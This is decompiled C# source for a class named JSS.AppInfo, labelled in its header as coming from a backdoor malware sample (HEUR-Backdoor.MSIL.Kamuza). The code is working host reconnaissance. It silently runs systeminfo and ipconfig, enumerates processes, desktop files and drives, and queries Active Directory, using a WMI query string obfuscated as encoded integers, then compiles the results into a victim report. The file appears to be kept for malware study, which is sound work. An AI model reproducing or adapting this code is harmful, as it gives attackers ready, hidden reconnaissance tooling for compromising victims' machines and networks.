// Decompiled with JetBrains decompiler
// Type: JSS.AppInfo
// Assembly: JSS, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CA27710C-27FC-4B6B-9AFB-DB45D81E1E20
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Backdoor.MSIL.Kamuza.gen-dd86898c784342fc11c42bea4c815cb536455ee709e7522fb64622d9171c465d.exe

using ActiveDs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;

namespace JSS
{
  internal class AppInfo
  {
    public static string HostName;
    public static string DomainName;
    public static string UserName;
    public static string LogicalDrives;
    public static string PSInfo;
    public static string SysInfo;
    public static string IPInfo;
    public static string DesktopFiles;
    public static string ADInfo;
    private const int MAX_PATH = 260;
    private const int CSIDL_COMMON_DESKTOPDIRECTORY = 25;

    public static string GetAllInfo()
    {
      AppInfo.GatherInfo();
      string str1 = "------------------------------------------------------------\n";
      string str2 = "============================================================\n\n";
      return string.Format("{0}. Host information report\n{1}", (object) "0x01", (object) str2) + string.Format("HOST: '{0}'  DOMAIN: '{1}'  USER: '{2}'\n", (object) AppInfo.HostName, (object) AppInfo.DomainName, (object) AppInfo.UserName) + string.Format("LOGICAL DRIVES: '{0}'\n{1}", (object) AppInfo.LogicalDrives, (object) str2) + string.Format("System info\n{0}{1}\n{2}", (object) str1, (object) AppInfo.SysInfo, (object) str2) + string.Format("Network info\n{0}{1}\n{2}", (object) str1, (object) AppInfo.IPInfo, (object) str2) + string.Format("Process list\n{0}{1}\n{2}", (object) str1, (object) AppInfo.PSInfo, (object) str2) + string.Format("Desctop file list\n{0}{1}\n{2}", (object) str1, (object) AppInfo.DesktopFiles, (object) str2) + string.Format("ADInfo\n{0}{1}\n{2}", (object) str1, (object) AppInfo.ADInfo, (object) str2) + "End of report";
    }

    public static void GatherInfo()
    {
      AppInfo.HostName = Environment.MachineName;
      AppInfo.DomainName = Environment.UserDomainName;
      AppInfo.UserName = Environment.UserName;
      AppInfo.LogicalDrives = string.Join("; ", Environment.GetLogicalDrives());
      AppInfo.PSInfo = AppInfo.GatherPSInfo();
      AppInfo.SysInfo = AppInfo.GatherCmdOutput("C:\\Windows\\System32\\systeminfo.exe", "");
      AppInfo.IPInfo = AppInfo.GatherCmdOutput("C:\\Windows\\System32\\ipconfig.exe", "/all");
      AppInfo.DesktopFiles = AppInfo.GatherDesktopFiles();
      AppInfo.ADInfo = AppInfo.GatherADInformation();
    }

    public static string GatherCmdOutput(string theCmd, string theArgs)
    {
      List<string> stringList = new List<string>();
      try
      {
        Process process = new Process()
        {
          StartInfo = new ProcessStartInfo()
          {
            FileName = theCmd,
            Arguments = theArgs,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            CreateNoWindow = true
          }
        };
        process.Start();
        while (!process.StandardOutput.EndOfStream)
          stringList.Add(process.StandardOutput.ReadLine());
        process.WaitForExit();
      }
      catch (Exception ex)
      {
      }
      return string.Join("\n", stringList.ToArray());
    }

    public static string GatherPSInfo()
    {
      Dictionary<string, int> source = new Dictionary<string, int>();
      foreach (Process process in Process.GetProcesses())
        source[process.ProcessName] = process.Id;
      string str = "";
      foreach (KeyValuePair<string, int> keyValuePair in (IEnumerable<KeyValuePair<string, int>>) source.OrderBy<KeyValuePair<string, int>, string>((Func<KeyValuePair<string, int>, string>) (key => key.Key)))
        str += string.Format("{0,6:D}   {1}\n", (object) keyValuePair.Value, (object) keyValuePair.Key);
      return str.TrimEnd();
    }

    public static string GatherDesktopFiles()
    {
      List<string> stringList = new List<string>();
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
      if (Directory.Exists(folderPath))
      {
        foreach (string file in Directory.GetFiles(folderPath, "*", SearchOption.AllDirectories))
          stringList.Add(file);
      }
      string path = AppInfo.GatherCommonDesctopDir();
      if (Directory.Exists(path))
      {
        foreach (string file in Directory.GetFiles(path, "*", SearchOption.AllDirectories))
          stringList.Add(file);
      }
      string str = "";
      stringList.Sort();
      foreach (string fileName in stringList)
        str += string.Format("{0,10:N0}   {1}\n", (object) new FileInfo(fileName).Length, (object) fileName);
      str.TrimEnd();
      return str;
    }

    [DllImport("shfolder.dll", CharSet = CharSet.Auto)]
    private static extern int SHGetFolderPath(
      IntPtr hwndOwner,
      int nFolder,
      IntPtr hToken,
      int dwFlags,
      StringBuilder lpszPath);

    public static string GatherCommonDesctopDir()
    {
      StringBuilder lpszPath = new StringBuilder(260);
      AppInfo.SHGetFolderPath(IntPtr.Zero, 25, IntPtr.Zero, 0, lpszPath);
      return lpszPath.ToString();
    }

    public static string GatherADInformation()
    {
      string adComputerName = AppInfo.getADComputerName();
      string str = adComputerName.Length <= 0 ? "adinformation***no_ad\n" : "adinformation***" + adComputerName + "\n";
      byte[] bytes = AppInfo.Combine(BitConverter.GetBytes(1701602643), BitConverter.GetBytes(706770019), BitConverter.GetBytes(1869768224), BitConverter.GetBytes(1767317613), BitConverter.GetBytes(1597125486), BitConverter.GetBytes(1886220099), BitConverter.GetBytes(1919251573), BitConverter.GetBytes(1953724755), BitConverter.GetBytes(28005));
      SelectQuery query = new SelectQuery(Encoding.UTF8.GetString(bytes, 0, bytes.Length - 2));
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher((ObjectQuery) query))
        {
          foreach (ManagementObject managementObject in managementObjectSearcher.Get())
          {
            managementObject.Get();
            str = !(managementObject["PartOfDomain"].ToString() == "False") ? str + "part_of_domain***yes\n" : str + "part_of_domain***no\n";
            str = str + "pc_domain***" + managementObject["Domain"] + "\n";
            str = str + "pc_dns_host_name***" + managementObject["DNSHostName"] + "\n";
            str = str + "pc_model***" + managementObject["Model"] + "\n";
          }
        }
      }
      catch (Exception ex)
      {
      }
      str.TrimEnd();
      return str;
    }

    public static string getADComputerName()
    {
      string adComputerName = "";
      try
      {
        adComputerName = ((IADsADSystemInfo) Activator.CreateInstance(Type.GetTypeFromCLSID(new Guid("50B6327F-AFD1-11D2-9CB9-0000F87A369E")))).ComputerName.ToString();
      }
      catch (Exception ex)
      {
      }
      return adComputerName;
    }

    public static byte[] Combine(params byte[][] arrays)
    {
      byte[] dst = new byte[((IEnumerable<byte[]>) arrays).Sum<byte[]>((Func<byte[], int>) (x => x.Length))];
      int dstOffset = 0;
      foreach (byte[] array in arrays)
      {
        Buffer.BlockCopy((Array) array, 0, (Array) dst, dstOffset, array.Length);
        dstOffset += array.Length;
      }
      return dst;
    }
  }
}
